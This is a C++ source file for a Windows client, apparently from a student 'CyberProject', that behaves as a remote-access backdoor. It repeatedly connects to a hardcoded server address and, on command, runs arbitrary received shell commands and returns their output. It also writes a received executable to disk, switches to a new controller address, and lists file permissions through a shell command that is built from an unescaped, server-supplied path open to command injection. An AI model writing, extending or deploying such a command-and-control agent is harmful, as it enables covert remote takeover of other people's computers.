#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <fstream>
#include "Socket.h"
#include "WindowsSocket.h"
#include "string.h"
#include "Aclapi.h""
using namespace std;

#define DEFAULT_BUFLEN 1050
#define DEFAULT_PORT "5005"
#define DEFAULT_HOST "192.168.43.49"

std::ofstream openFile(char *file_path)
{
	std::ofstream f2(file_path, std::fstream::binary);
	return f2;
}

void create_file(Socket clientSocket, SOCKET socket, char* recBuf, int iResult)
{
	char * filePath = "C:\\Users\\admin\\Desktop\\CyberProject\\Client\\client_update_file.exe";
	std::ofstream clientFile = openFile(filePath);
	int iResult2;
	char recvbuf[DEFAULT_BUFLEN * 4];

	do
	{
		//char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
		memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
		iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
		iResult2 = clientSocket.send_data(socket, "ok");
		if ((strcmp(recvbuf, "END_UPDATE") != 0))
		{
			clientFile.write(recvbuf, iResult);
			printf("Bytes received: %d\n", iResult);
		}

	} while (strcmp(recvbuf, "END_UPDATE") != 0);


	if (!strcmp(recvbuf, "END_UPDATE"))
	{
		clientFile.close();
		cout << "closed the file" << endl;
	}
}
std::string exec(const char* cmd)
{
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}
void executeCommand(Socket clientSocket, SOCKET socket)
{
	char recvbuf[DEFAULT_BUFLEN * 4];
	int iResult, iResult2;
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
	iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	iResult2 = clientSocket.send_data(socket, "ok");//ok
	std::string w = exec(recvbuf);
	cout << w.c_str() << endl;
	clientSocket.send_data(socket, w.c_str());
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);//
	iResult = clientSocket.receive(socket, recvbuf, 2);//ok
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
	iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	iResult2 = clientSocket.send_data(socket, "ok");
	if (!strcmp(recvbuf, "END_EXECUTE"))
	{
		cout << "end execute" << endl;
	}
}

void dirInfo(Socket clientSocket, SOCKET socket)
{
	//get directory size
	int iResult, iResult2;
	char sizeOfPacket[DEFAULT_BUFLEN];
	memset(sizeOfPacket, 0, DEFAULT_BUFLEN);
	iResult = clientSocket.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
	iResult2 = clientSocket.send_data(socket, "ok");//ok

	//get directory
	int sizePacket = atoi(sizeOfPacket);
	char *packet = new char[sizePacket + 1];
	memset(packet, 0, sizePacket + 1);
	iResult = clientSocket.receive(socket, packet, sizePacket+1);
	iResult2 = clientSocket.send_data(socket, "ok");//ok

	//char * command = "cd \"C:\\Users\\admin\\Desktop\\Analysis\" && for /f %x in ('dir /b') do icacls %x";
	string dir = string(packet);
	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b /a') do icacls %x && attrib %x";
	
	//executes the command
	std::string w = exec(command.c_str());

	//send size
	iResult2 = clientSocket.send_data(socket, to_string(w.length()).c_str());
	char *packetOK = new char[3];
	memset(packetOK, 0, 3);
	iResult = clientSocket.receive(socket, packetOK, 3);//ok

	//send result
	iResult2 = clientSocket.send_data(socket, w.c_str());
	memset(packetOK, 0, 3);
	iResult = clientSocket.receive(socket, packetOK, 3);//ok
	
}

bool changeIp(Socket & clientSocket, SOCKET & socket)
{
	//get size of packet
	char sizeOfPacket[DEFAULT_BUFLEN];
	int iResult, iResult2;
	memset(sizeOfPacket, 0, DEFAULT_BUFLEN);
	iResult = clientSocket.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
	iResult2 = clientSocket.send_data(socket, "ok");//ok
	int sizePacket = atoi(sizeOfPacket);

	//get ip:port
	char *packet = new char[sizePacket+1];
	memset(packet, 0, sizePacket+1);
	iResult = clientSocket.receive(socket, packet, DEFAULT_BUFLEN);
	iResult2 = clientSocket.send_data(socket, "ok");//ok
	char* ip = strtok(packet, ":");
	char* port = strtok(NULL, ":");

	//try to connect to 
	Socket newClientSocket;
	//WindowsSocket windowsSocket;
	SOCKET newSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL, hints;
	char *sendbuf = "this is a test14";
	char recvbuf[DEFAULT_BUFLEN];
	//int iResult, iResult2;
	int recvbuflen = DEFAULT_BUFLEN;

	//windowsSocket.startup();
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		throw new exception("getaddrinfo failed with error: %d\n", iResult);
	}

	newClientSocket.setAddrInfo(result);

	// Attempt to connect to an address until one succeeds
	int i = 0;
	int connectResult = SOCKET_ERROR;
	
	// Create a SOCKET for connecting to server
	newSocket = newClientSocket.create();
	bool connected = false;
	while (i < 3) // handle timeout!
	{

		// Connect to server.
		connectResult = newClientSocket.conn(newSocket);
		if (connectResult == SOCKET_ERROR) {
			newClientSocket.close(newSocket);
			newSocket = INVALID_SOCKET;
			i++;
			continue;
		}
		connected = true;
		break;
	}

	freeaddrinfo(result);
	if (connected)
	{
		iResult2 = clientSocket.send_data(socket, "accept");
		clientSocket.close(socket);
		clientSocket = newClientSocket;
		socket = newSocket;
	}

	delete[] packet;
	return connected;
}


//int main()
//{
//	string dir = "c:\\";
//	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b') do icacls %x";
//	char * c = "\" && for /f %x in ('dir /b') do icacls %x";
//	cout << c;
//
//	cout << command;
//}
int main(int argc, char **argv)
{
	Socket clientSocket;
	WindowsSocket windowsSocket;
	SOCKET socket = INVALID_SOCKET;

	struct addrinfo *result = NULL, hints;
	char *sendbuf = "this is a test14";
	char recvbuf[DEFAULT_BUFLEN];
	int iResult, iResult2;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	try
	{
		windowsSocket.startup();
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// Resolve the server address and port
		iResult = getaddrinfo(DEFAULT_HOST, DEFAULT_PORT, &hints, &result);
		if (iResult != 0) {
			throw new exception("getaddrinfo failed with error: %d\n", iResult);
		}

		clientSocket.setAddrInfo(result);

		// Attempt to connect to an address until one succeeds
		bool connectResult = false;
		while (true) // handle timeout!
		{
			// Create a SOCKET for connecting to server
			socket = clientSocket.create();

			// Connect to server.
			connectResult = clientSocket.conn(socket);
			if (connectResult == SOCKET_ERROR) {
				clientSocket.close(socket);
				socket = INVALID_SOCKET;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		// Send an initial buffer
		iResult = clientSocket.send_data(socket, sendbuf);

		printf("Bytes Sent: %ld\n", iResult);

		// Receive until the peer closes the connection
		do {
			try
			{
				char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
				iResult = clientSocket.receive(socket, recvbuf, recvbuflen * 4);
				iResult2 = clientSocket.send_data(socket, "ok");
				if (iResult > 0)
				{

					//string buf = string(recvbuf);
					//cout << buf.substr(0, iResult);

					if (!strcmp(recvbuf, "UPDATE"))
					{
						create_file(clientSocket, socket, recvbuf, iResult);
					}
					else if (!strcmp(recvbuf, "EXECUTE"))
					{
						executeCommand(clientSocket, socket);
					}
					else if (!strcmp(recvbuf, "CHANGE_IP"))//2, 5
					{
						bool connected = changeIp(clientSocket, socket);
						if (connected)
						{
							iResult2 = clientSocket.send_data(socket, "this is a test");

						}
						else
						{
							iResult2 = clientSocket.send_data(socket, "reject");
						}
					}
					else if (!strcmp(recvbuf, "FILE_SYSTEM_INFO"))//2, 6
					{
						dirInfo(clientSocket, socket);
					}
					else
					{
						printf("Bytes received: %d\n", iResult);
						//iResult2 = clientSocket.send_data(socket, "ok");
						string buf = string(recvbuf);
						cout << buf.substr(0, iResult);
					}
				}
			}
			catch (exception ex)
			{
				cout << ex.what();
				continue;
			}

		} while (iResult > 0);

		// cleanup

		clientSocket.close(socket);
		windowsSocket.cleanup();
		return 0;
	}
	catch (exception ex)
	{
		cout << ex.what();
		windowsSocket.cleanup();
		return 1;
	}
}


